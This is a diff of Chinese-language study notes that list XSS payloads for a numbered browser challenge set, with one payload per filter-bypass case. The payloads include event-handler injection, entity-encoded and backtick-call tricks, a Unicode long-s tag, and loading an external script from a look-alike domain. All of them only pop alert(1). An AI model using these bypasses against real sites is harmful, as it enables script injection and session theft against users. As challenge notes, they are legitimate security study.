@@ -116,16 +116,21 @@ alert(1)-->    // HTML 单行注释符
 
 ### 0x02 - input 标签属性注入
 ```javascript
-" onfocus=alert(1) autofocus "
+"><image src='#' onerror=alert(1) autofocus "
 ```
 
 ### 0x03 - 括号过滤
 ```javascript
-<script>alert\`1\`</script>
+<script>alert`1`</script>
+```
+```javascript
 <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
 ```
 
 ### 0x04 - 括号和反引号过滤
+```javascript
+<img src=x onerror=alert(1)>
+```
 ```javascript
 <img src onerror="window.onerror=eval;throw'=alert\x281\x29';">
 ```
@@ -135,15 +140,17 @@ alert(1)-->    // HTML 单行注释符
 --!><script>alert(1)</script>
 ```
 
-### 0x06 - 正则过滤 auto/on.*=/>/ig
+### 0x06 - 正则过滤 auto/on.*=/>/ig，点击触发
+
 ```javascript
 onfocus
 =alert(1);
 ```
 
-### 0x07 - 过滤所有标签
+### 0x07 - 过滤所有标签，使用不闭合标签加回车
+
 ```javascript
-<svg/onload=alert(1)>
+<svg onload=alert(1)\n
 ```
 
 ### 0x08 - 过滤 </style>
@@ -157,24 +164,26 @@ onfocus
 http://www.segmentfault.com" onerror="alert(1)
 ```
 
-### 0x0A - URL 验证 + 实体编码
+### 0x0A - URL 验证 + 引入外部文件
+
 ```javascript
 https://www.segmentfault.com.haozi.me/j.js
 ```
 
-### 0x0B - 大写转换
+### 0x0B - 大写转换+实体编码绕过
+
 ```javascript
-</H1> <img src=M onerror=alert(1)>
+</H1> <img src=M onerror=&#97;&#108;&#101;&#114;&#116;(1)>
 ```
 
-### 0x0C - 过滤 script + 大写转换
+### 0x0C - 过滤 script + 大写转换+实体编码绕过
+
 ```javascript
-</H1> <img src onerror=alert(1)>
-</H1> <scrscriptipt src onerror=alert(1)></scrscriptipt>
-</H1> <svg onload=alert(1)>
+</H1> <img src onerror=&#97;&#108;&#101;&#114;&#116;(1)>
 ```
 
 ### 0x0D - 过滤 <>/'" + 单行注释
+
 ```javascript
 （第一行：回车）
 alert(1);
@@ -183,7 +192,7 @@ alert(1);
 
 ### 0x0E - 过滤 <+字母 + 大写转换
 ```javascript
-<ſvg/onload=alert(1)>
+<ſcript src=https://www.segmentfault.com.haozi.me/j.js></ſcript>
 ```
 
 ### 0x0F - 实体编码 + console.error
@@ -204,6 +213,9 @@ alert(1);
 ### 0x12 - 仅过滤双引号
 ```javascript
 \");alert(1)//
+```
+```javascript
+</script><script>alert(1)</script>
 ```
 
 ---
@@ -314,5 +326,5 @@ oninput      // 输入
 
 ---
 
-**最后更新**: 2026-02-06
+**最后更新**: 2026-02-11
 **版本**: 1.0
